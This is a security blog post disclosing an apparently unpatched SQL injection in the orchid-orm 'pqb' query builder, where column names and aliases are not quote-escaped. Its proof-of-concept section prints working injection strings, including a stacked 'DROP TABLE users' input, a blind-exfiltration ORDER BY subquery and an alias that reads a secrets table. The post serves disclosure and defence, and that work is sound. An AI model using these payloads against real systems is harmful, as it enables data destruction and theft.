---
layout: post
title: "The Alias That Wasn't"
subtitle: "A type-safe query builder that escapes every value you give it — and then hands your column aliases to Postgres raw, quotes and all."
date: 2026-09-10
tags: [sql-injection, orm, typescript, postgres, cwe-89, full-disclosure]
read_time: "7 min read"
---

There is a specific kind of bug I go looking for now, because it keeps being there: the ORM that is *scrupulously* careful about values and quietly careless about identifiers. Values are the thing everyone was taught to fear — `WHERE email = $1`, parameterise it, never concatenate. So the value path in a modern query builder is a fortress. The identifier path — column names, table names, aliases — is the side door nobody guards, because identifiers feel like *structure*, like something you wrote, not something the user did.

This is a story about the side door in [orchid-orm](https://github.com/romeerez/orchid-orm), a nice, modern, TypeScript-first ORM. Its query builder core is a package called `pqb`.

## The boring part

Orchid's pitch is type safety. You call `.select()`, `.order()`, `.as()` and you get back exactly the columns you asked for, typed, with values bound as parameters. It has the raw escape hatches too — `.raw()`, ``sql`` `` — clearly labelled as *your problem now*. Everything else is supposed to be safe. That is the contract.

So the interesting question is never "is `.raw()` dangerous" (yes, obviously). It is: **can I get something dangerous through the front door — the safe, typed API that promises it handled the quoting?**

The quoting all funnels through one place. Postgres delimits identifiers with double quotes: `"my column"`. To put a literal `"` *inside* an identifier you double it — `"my ""column"""`. That doubling is the entire safety mechanism. Miss it and the identifier is injectable.

Orchid knows this. It even has the correct helper — I found it in the same bundle:

```js
// pqb/dist/index.js
return `"${role.replace(/"/g, '""')}"`;   // this one doubles. good.
```

## The tilt-your-head part

That helper exists. It is just not the code that runs when you serialize a column or an alias. That code, a few thousand lines away, looks like this:

```js
:6716  sql = `${quotedAs ? `${quotedAs}.` : ''}"${key}"`;    // column — raw ${key}
:6729  sql = `${quotedAs ? `${quotedAs}.` : ''}"${name}"`;   // column — raw ${name}
:6734  if (as && !dontAlias) sql = `${sql} "${as}"`;         // alias — raw ${as}
```

`${key}`, `${name}`, `${as}` — dropped straight between two `"` with no `.replace()` in sight. The doubling helper is right there in the file and this path just… doesn't call it. It is not a design decision that identifiers are trusted; it is one serializer that forgot the thing another serializer in the same file remembered.

Which means: if I can get a `"` into a column name or an alias through the safe API, I close the identifier early and everything after it is live SQL.

Can I? The alias in `.select({ alias: column })` is an *object key*. The column in `.order()` is a *string*. Both are exactly the kind of thing an app derives from user input — a `?sort=` parameter, a GraphQL field alias, a user-named CSV export column. None of it is validated on the way in; the serializer is the only quoting layer, and the serializer forgot.

<div class="callout">The tell for this whole bug class: a library that parameterises values <em>perfectly</em> but builds identifiers with a bare <code>"${x}"</code>. The care taken on values is proof they know the difference — which makes the identifier miss an omission, not a philosophy.</div>

## Proof

I ran this against the real published `pqb@0.73.6` — the current `latest` on npm. No database needed: orchid builds the SQL string with `.toSQL()`, so the generated query *is* the evidence. The table is defined with the fully safe API (`t.text()`, `.primaryKey()`); only the identifiers are attacker-shaped.

<div class="term">
  <div class="term-bar"><span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span><span class="term-title">node poc.js — pqb 0.73.6 (current latest)</span></div>
<pre><span class="dim">--- .order(col) — stacked statement via a dynamic ?sort= column ---</span>
input : <span class="cmd">name" DESC; DROP TABLE users; --</span>
SQL   : SELECT * FROM "user" ORDER BY "user"."name" DESC; <span class="bad">DROP TABLE users;</span> --" ASC

<span class="dim">--- .order(col) — single-statement exfil (works even without stacked queries) ---</span>
input : <span class="cmd">name" DESC, (SELECT current_setting('is_superuser'))--</span>
SQL   : SELECT * FROM "user" ORDER BY "user"."name" DESC, <span class="warn">(SELECT current_setting('is_superuser'))</span>--" ASC

<span class="dim">--- .select({ alias: col }) — subquery injected through an alias key ---</span>
alias : <span class="cmd">total" , (SELECT string_agg(name,',') FROM secrets) "leak</span>
SQL   : SELECT "user"."name" "total" , <span class="bad">(SELECT string_agg(name,',') FROM secrets)</span> "leak" FROM "user"</pre>
</div>

Look at the middle one, because it is the one that matters. It is a *single valid statement* — no stacked-query support required, which many drivers disable. The attacker's subquery just becomes part of the `ORDER BY`, and its true/false effect on row ordering is a classic blind-exfiltration oracle. The alias case is even more direct: a whole subquery reading a `secrets` table, spliced into the projection and politely re-quoted as `"leak"` so the statement stays valid.

The string you handed the builder as *one identifier* came back out as SQL with the quotes broken open. That is the whole bug.

## The one-line fix

It is the helper that was already in the file:

```js
// vulnerable
$("#query")   // no — wrong library. in pqb:
sql = `"${key}"`;
// fixed
sql = `"${key.replace(/"/g, '""')}"`;   // and name, and as, and table
```

Double the embedded quote at each identifier sink, exactly as `quoteIdentifier` already does thirty lines up. Or, cleaner for the alias case specifically: an alias that is only ever displayed as a column label never needs to contain a `"` at all, so validating it against `/^[A-Za-z0-9_]+$/` closes the door without relying on escaping being perfect.

## Where this stands

At the time of writing this is present on `pqb@0.73.6` / `orchid-orm@1.78.7` — the current published versions — and there is **no CVE and no fix yet**. I'm writing it up as full disclosure: the defect is a two-character omission, the fix is trivial and already-templated by the library's own code, and anyone routing a `?sort=` or a GraphQL alias into orchid's "safe" builder should know today, not whenever a patch happens to land. If you run orchid, the immediate mitigation is yours and takes a minute: never pass a user-derived string into a column or alias position — allowlist it against your actual schema first.

## Takeaways

- **A perfect value path is not a safe query builder.** The value fortress and the identifier side door live in the same library. Audit both.
- **The delimiter question is universal.** `"` for Postgres, `` ` `` for MySQL, `]` for SQL Server. Every identifier quoter must double its own delimiter. Every one that doesn't is this bug.
- **Look for the sibling that got it right.** When one function in a file escapes and another doesn't, you are not looking at a trust boundary — you are looking at a bug, and the correct code is sitting right there to prove it.

<hr>

*Full disclosure. Present on `pqb@0.73.6` / `orchid-orm@1.78.7` (current latest) at time of writing; no CVE assigned and no fix released. Reproduced live against the published package.*
